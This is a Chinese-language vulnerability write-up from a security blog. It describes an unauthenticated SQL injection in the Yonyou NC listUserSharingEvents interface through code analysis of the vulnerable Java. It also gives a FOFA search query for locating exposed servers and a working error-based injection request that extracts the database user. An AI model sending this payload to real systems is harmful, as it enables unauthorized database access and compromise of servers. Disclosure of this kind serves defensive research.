---
title: "用友NC listUserSharingEvents SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-agent-sqli.html
asset_dir: assets/用友nc-listusersharingevents-sql注入漏洞
---

# 用友NC listUserSharingEvents SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/4/9 08:28
- 2077浏览
- [4评论](#comment)
- 34分钟阅读

深入探索

SQL

授权

sql

---

# 漏洞简介

⽤友NC listUserSharingEvents 接⼝处存在[SQL注⼊漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，未授权的攻击者可以通过此漏洞获取数据库权限，进 ⼀步利⽤可导致服务器失陷。

# 影响版本

nc65

# fofa语法

> `app="⽤友-UFIDA-NC"`

# 漏洞分析

看下 `listUserSharingEvents` 的业务逻辑实现

```
@Action
    public void listUserSharingEvents() throws BusinessException {
        String sch_startdate = this.getRequest().getParameter("sch_sd");
        String sch_enddate = this.getRequest().getParameter("sch_ed");
        String agent = this.getRequest().getParameter("agent");
        Map<String, String[]> sharingUsersMap = this.getDataOfUserSharingEvents(sch_startdate, sch_enddate, agent);
        StringBuilder sb = new StringBuilder();
        sb.append("<?xml version='1.0' encoding='UTF-8' ?>");
        sb.append("<share>");
        Iterator<Map.Entry<String, String[]>> iter = sharingUsersMap.entrySet().iterator();
        String[] tmp = null;

        while(iter.hasNext()) {
            Map.Entry<String, String[]> ent = (Map.Entry)iter.next();
            tmp = (String[])ent.getValue();
            sb.append("<user><name><![CDATA[").append(tmp[0]).append("]]></name><value><![CDATA[").append((String)ent.getKey()).append("]]></value><color><![CDATA[").append(tmp[2]).append("]]></color><stat><![CDATA[").append(tmp[1]).append("]]></stat></user>");
        }

        sb.append("</share>");
        CommonUtils.outputClientStreamWithGzip(this.getResponse(), "text/xml", sb.toString());
    }
```

`agent` 带入 `getDataOfUserSharingEvents` 方法

```
private Map<String, String[]> getDataOfUserSharingEvents(String startdate, String enddate, String agent) throws BusinessException {
        String pk_user = StringUtils.isNotEmpty(agent) ? agent : (String)CommonUtils.getCurrentPkPerson();
        ICpUserQry cpuserQuery = (ICpUserQry)NCLocator.getInstance().lookup(ICpUserQry.class);
        ISchedulerCacheQueryService schedulerCacheQueryService = (ISchedulerCacheQueryService)NCLocator.getInstance().lookup(ISchedulerCacheQueryService.class);
        String whereSql = this.getWhereSqlOfUserPksOfSharedEvent(pk_user, startdate, enddate);
        CpUserVO[] cpusers = cpuserQuery.getUserByWhere("cuserid in(" + whereSql + ")");
```

`agent` ==> `pk_user` ==> `getWhereSqlOfUserPksOfSharedEvent`

```
private String getWhereSqlOfUserPksOfSharedEvent(String pk_current_user, String start_date, String end_date) {
        String scopeSetWhereSql = "";

        try {
            scopeSetWhereSql = ScopeSetUtil.getScopeSetWhereSql(pk_current_user, "oacoscheduler", "fk_share", true, true, true, true);
        } catch (LfwBusinessException e) {
            Logger.error(e.getMessage());
        }

        String sql = "select distinct a.pk_user from oaco_schedulerevent a  where a.pk_user <> '%s' and a.pk_event in %s";
        sql = sql + " and ('%s' between a.recurstartdate and a.recurenddate or '%s' between a.recurstartdate and a.recurenddate or a.recurstartdate between '%s' and '%s') ";
        sql = String.format(sql, pk_current_user, scopeSetWhereSql, start_date, end_date, start_date, end_date);
        return sql;
    }
```

深入探索

网络安全培训

安全认证考试

JSON处理工具

可以看到直接拼接 `pk_current_user` 到sql语句中，然后拼接到 `cuserid in(` 语句后，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

默认这个接口的响应如下，也符合上面漏洞分析里对应的代码部分

[![用友NC listUserSharingEvents SQL注入漏洞](images/img-001-aabfc074fe25.webp)](https://image.mrxn.net/33b99db471084cebb8ddd87769d7cbc0.webp)

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用

```
GET /portal/pt/oacoSchedulerEvents/listUserSharingEvents?agent=6')+AND+1=UTL_INADDR.GET_HOST_ADDRESS('~'||(user)||'~')--&pageId=login&sch_ed=2&sch_sd=1 HTTP/1.1
Host: nc.mrxn.net
```

通过报错[注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，成功报出数据库版本信息

[![用友NC listUserSharingEvents SQL注入漏洞](images/img-002-a1a186868377.webp)](https://image.mrxn.net/eacfe57ba007452fa8af0a45fb2ce7d2.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
